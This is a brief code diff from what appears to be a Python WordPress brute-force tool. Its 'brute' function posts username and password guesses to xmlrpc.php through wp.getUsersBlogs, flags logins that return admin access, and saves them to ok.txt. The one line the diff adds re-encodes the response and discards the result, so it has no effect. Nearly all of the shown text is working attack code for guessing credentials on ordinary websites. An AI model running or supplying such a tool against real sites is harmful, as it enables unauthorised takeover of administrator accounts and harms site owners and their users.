@@ -28,6 +28,7 @@ def brute(uri, user, pwd):
   site = ("%s/xmlrpc.php" % (uri))
   post = ("<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>" % (user, pwd))
   p = r.post(site, data=post, headers=headers)
+  p.text.encode("ascii", "ignore")
   if "isAdmin" in p.text:
     print("%s%s/wp-login.php#%s@%s" % (Fore.GREEN, uri, user, pwd))
     op = open("ok.txt", "a")
